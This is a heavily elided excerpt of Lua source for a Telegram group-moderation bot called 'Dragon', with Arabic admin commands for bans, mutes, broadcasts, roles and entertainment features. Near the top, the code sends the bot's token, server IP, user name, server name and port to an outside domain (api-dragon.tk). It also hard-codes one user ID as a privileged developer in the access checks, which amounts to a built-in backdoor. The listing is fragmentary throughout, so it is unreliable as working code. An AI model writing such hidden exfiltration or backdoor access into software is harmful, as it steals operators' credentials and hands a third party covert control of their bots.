...
data,res = https.request("https://api-dragon.tk/api-d_y_c/Dragon.php?bn=DRAGON&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-dragon.tk/api-d_y_c/Dragon.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
...
sudo_users = {SUDO,5030377536,5030377536}   
...
function DevSaJaD(msg) 
local hash = database:sismember(bot_id.."Dev:SaJaD:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevSaJaD(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevSaJaD(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevSaJaD(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevSaJaD(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevSaJaD(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
local hash = database:sismember(bot_id.."d_y_c:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSaJaD(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
if hash or SudoBot(msg) or DevSaJaD(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevSaJaD(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(5030377536) then  
var = true  
elseif tonumber(user_id) == tonumber(5030377536) then
var = true  
elseif tonumber(user_id) == tonumber(5030377536) then
var = true  
...
var = true  
elseif database:sismember(bot_id.."Dev:SaJaD:2", user_id) then
var = true  
...
var = true  
elseif database:sismember(bot_id..'d_y_c:MN:TF'..chat_id, user_id) then
var = true 
...
local UserName = (data.username_ or "d_y_c")
...
if not DevSaJaD(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevSaJaD(msg) and msg.reply_to_message_id_ ~= 0  then    
...
if text == 'تفعيل التواصل ℘' and DevSaJaD(msg) then  
...
if text == 'تعطيل التواصل ℘' and DevSaJaD(msg) then  
...
if text == 'تفعيل البوت الخدمي ℘' and DevSaJaD(msg) then  
...
if text == 'تعطيل البوت الخدمي ℘' and DevSaJaD(msg) then  
...
if text == 'ضع كليشه ستارت ℘' and DevSaJaD(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ℘︙ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت ℘' and DevSaJaD(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ℘' and DevSaJaD(msg) then 
...
if text == 'تحديث السورس ℘' and DevSaJaD(msg) then 
...
if text == 'الاصدار ℘' and DevSaJaD(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس دراكون \n ℘︙ الاصدار »{ v 1.6 }')
end
if text == "ضع اسم للبوت ℘" and DevSaJaD(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات ℘' and DevSaJaD(msg) then 
...
if text == 'المشتركين ℘' and DevSaJaD(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ℘︙ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ℘' and DevSaJaD(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ℘︙ الكروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ℘") and DevSaJaD(msg) then
...
if text == ("الثانويين ℘") and DevSaJaD(msg) then
local list = database:smembers(bot_id..'Dev:SaJaD:2')
t = "\n ℘︙ قائمة الثانويين \nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
-------------
if text == "🐉 حصريات و تحديثات دراكـون 🐉" and DevSaJaD(msg) then  
local updatech =[[
...
{{text = '📂┇𝙳𝚁𝙰𝙶𝙾𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/YYQQO"}},
}
...
-----------
if text == ("قائمه العام ℘") and DevSaJaD(msg) then
...
if text == ("قائمه الكتم العام ℘") and DevSaJaD(msg) then
...
if text=="اذاعه خاص ℘" and msg.reply_to_message_id_ == 0 and DevSaJaD(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل الان اذاعتك؟ \n ℘︙ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ℘" and msg.reply_to_message_id_ == 0 and DevSaJaD(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل الان اذاعتك؟ \n ℘︙ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ℘" and msg.reply_to_message_id_ == 0 and DevSaJaD(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل الان اذاعتك؟ \n ℘︙ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ℘" and msg.reply_to_message_id_ == 0  and DevSaJaD(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ℘" and msg.reply_to_message_id_ == 0  and DevSaJaD(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ℘︙ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ℘' and DevSaJaD(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ℘" and DevSaJaD(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الكروبات ℘" and DevSaJaD(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مطور @(.*)$") and DevSaJaD(msg) then
...
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'd_y_c')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevSaJaD(msg) then
...
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevSaJaD(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevSaJaD(msg) then
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'd_y_c')..') \n ℘︙ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/d_y_c)}\n ℘︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ℘︙ عذرا » {["..data.first_name_.."](T.ME/d_y_c)}\n ℘︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSaJaD(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevSaJaD(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevSaJaD(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ℘︙ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevSaJaD(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ℘︙ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ℘" and DevSaJaD(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ℘︙ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ℘$") and DevSaJaD(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ℘︙ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ℘" and DevSaJaD(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري ℘" and DevSaJaD(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ℘︙ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ℘" and DevSaJaD(msg) then  
...
function d_y_c_name(t1,t2)
if t2.id_ then 
name_MRSaJaD = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRSaJaD then 
names_MRSaJaD = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_) or ""
if names_MRSaJaD and names_MRSaJaD[1] then 
for i=1,#names_MRSaJaD do 
if name_MRSaJaD:match("(.*)("..names_MRSaJaD[i]..")(.*)") then 
...
bnnaGet(msg.sender_user_id_, d_y_c_name)
end
...
function SaJaD_mrSaJaD_new(mrSaJaD1,mrSaJaD2)
if mrSaJaD2 and mrSaJaD2.first_name_ then 
if mrSaJaD2.first_name_:match("(.*)"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."DRAGON:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrSaJaD_nnn = database:get(bot_id.."DRAGON:nump"..msg.chat_id_) or 5
local mrSaJaD_nnn2 = database:get(bot_id.."DRAGON:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrSaJaD_nnn2) == tonumber(mrSaJaD_nnn) or tonumber(mrSaJaD_nnn2) > tonumber(mrSaJaD_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."DRAGON:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrSaJaD2.username_.."](https://t.me/"..(mrSaJaD2.username_ or "d_y_c")..")\n℘︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrSaJaD_nnn) - tonumber(mrSaJaD_nnn2)).."}")
end
end
end
end
bnnaGet(id, SaJaD_mrSaJaD_new)
end
end
...
℘ ⦑ SOURCE DRAGON ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/d_y_c)
℘︙ [Source Update ](t.me/YYQQO)     
℘︙ [Source developer](t.me/d_y_c)     
℘︙ [Dragon programmer](t.me/YYQQO) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS DRAGON](t.me/v444bot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if text == 'رفع نسخه الاحتياطيه' and DevSaJaD(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'd_y_c')..') \n ℘︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'd_y_c')..') \n ℘︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevSaJaD(msg) then    
dofile('DRAGON.lua')  
send(msg.chat_id_, msg.id_, ' ℘︙ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevSaJaD(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevSaJaD(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevSaJaD(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevSaJaD(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevSaJaD(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevSaJaD(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevSaJaD(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevSaJaD(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevSaJaD(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevSaJaD(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevSaJaD(msg) then
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."d_y_c:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'d_y_c:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,SaJaD)
x = 0
tags = 0
local list = SaJaD.members_
for k, v in pairs(list) do
...
if text == 'الملفات' and DevSaJaD(msg) then
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevSaJaD(msg) then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevSaJaD(msg) then
...
if text == "مسح الملفات" and DevSaJaD(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ℘︙ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevSaJaD(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevSaJaD(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if database:get(bot_id..'DRAGOON:change:SaJaD'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:SaJaD'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:SaJaD'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:SaJaD'..msg.chat_id_,true)  
Text = '\n ℘︙ تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:SaJaD'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
database:sadd(bot_id.."Dev:SaJaD:2", result.sender_user_id_)
...
database:sadd(bot_id.."Dev:SaJaD:2", result.id_)
...
database:sadd(bot_id.."Dev:SaJaD:2", userid)
...
function Function_DRAGON(extra, result, success)
database:srem(bot_id.."Dev:SaJaD:2", result.sender_user_id_)
...
function Function_DRAGON(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:SaJaD:2", result.id_)
...
database:srem(bot_id.."Dev:SaJaD:2", userid)
...
database:del(bot_id.."Dev:SaJaD:2")
...
database:del(bot_id..'d_y_c:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ℘︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'d_y_c:MN:TF'..msg.chat_id_)
t = "\n ℘︙ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
status  = '\n ℘︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'd_y_c')..')'
status  = '\n ℘︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'d_y_c:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
status  = '\n ℘︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'd_y_c')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'d_y_c:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
status  = '\n ℘︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ℘︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
...
if text == 'مسح كليشه المطور' and DevSaJaD(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ℘︙ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevSaJaD(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ℘︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'd_y_c')..')'..'\n ℘︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevSaJaD(msg) then  
...
if text == 'تعطيل الاذاعه' and DevSaJaD(msg) then  
...
if not database:get(bot_id..'d_y_c:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'d_y_c:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."d_y_c:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."d_y_c:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "℘︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."d_y_c:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."d_y_c:allM"..msg.chat_id_)
...
if database:get(bot_id..'Bc:Bots') and not DevSaJaD(msg) then 
...
if database:sismember(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
database:srem(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:SaJaD:2',msg.sender_user_id_) then
database:srem(bot_id..'d_y_c:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevSaJaD(msg) then 
...
if text == ("ردود المطور") and DevSaJaD(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n℘︙قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
...
if text == "اضف رد للكل" and DevSaJaD(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "حذف رد للكل" and DevSaJaD(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.',url="t.me/d_y_c"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."d_y_c:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."d_y_c:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."d_y_c:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."d_y_c:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."d_y_c:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."d_y_c:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
if text == 'تفعيل المغادره' and DevSaJaD(msg) then   
...
if text == 'تعطيل المغادره' and DevSaJaD(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'd_y_c')..')'
local iduser = result.sender_user_id_
...
local SaJaD = ' ℘︙ عدد الادمنيه : '..data.administrator_count_..
'\n\n ℘︙ عدد المطرودين : '..data.kicked_count_..
'\n\n ℘︙ عدد الاعضاء : '..data.member_count_..
'\n\n ℘︙ عدد رسائل الكروب : '..(msg.id_/2097152/0.5)..
'\n\n ℘︙  اسم الكروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, SaJaD) 
end,nil)
end,nil)
end 
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,SaJaD,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (SaJaD.total_count_ or 0)
...
local rdphoto = SaJaDa[math.random(#SaJaDa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, SaJaD.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
SaJaD = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,SaJaD)  
...
SaJaD = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,SaJaD)  
...
if text == 'استعاده الاوامر' and DevSaJaD(msg) then
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/d_y_c"},
},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/SaJaD"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
...
database:set(bot_id.." SaJaD:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزغرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'℘︙ تم تفعيل الزغرفه')
database:set(bot_id.." SaJaD:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زغرفه (.*)$") and database:get(bot_id.." SaJaD:zhrf_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." SaJaD:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'℘︙ تم تفعيل الابراج')
database:set(bot_id.." SaJaD:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." SaJaD:brj_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." SaJaD:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '℘︙ تم تعطيل حساب العمر')
database:set(bot_id.." SaJaD:age_Bots"..msg.chat_id_,"close")
...
database:set(bot_id.." SaJaD:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." SaJaD:age_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.."SaJaD:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,'℘︙ تم تفعيل الافلام')
database:set(bot_id.."SaJaD:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."SaJaD:movie_bot"..msg.chat_id_) == "open" then
...
end -- end new msg dev.mr SaJaD 
end -- end callback dev.mr SaJaD
